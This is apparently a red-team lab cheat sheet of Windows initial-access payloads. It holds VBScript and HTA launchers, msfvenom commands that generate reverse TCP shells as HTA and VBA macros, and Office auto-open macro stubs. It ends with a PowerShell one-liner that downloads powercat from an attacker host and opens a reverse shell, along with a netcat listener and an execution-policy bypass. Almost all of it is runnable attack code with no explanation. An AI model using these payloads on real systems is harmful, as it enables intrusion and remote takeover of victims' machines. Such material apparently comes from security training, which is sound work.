# https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development
#cmd > wscript skrypt.vbs
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True

# script.hta
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
# msf6 > use exploit/windows/misc/hta_server

#VBA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.84.79 LPORT=443 -f vba
Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub
Sub Document_Open()
        Auto_Open
End Sub

# powershell
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
powershell -ex bypass -File thm.ps1

python3 -m http.server 8080
nc -lvp 1337
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
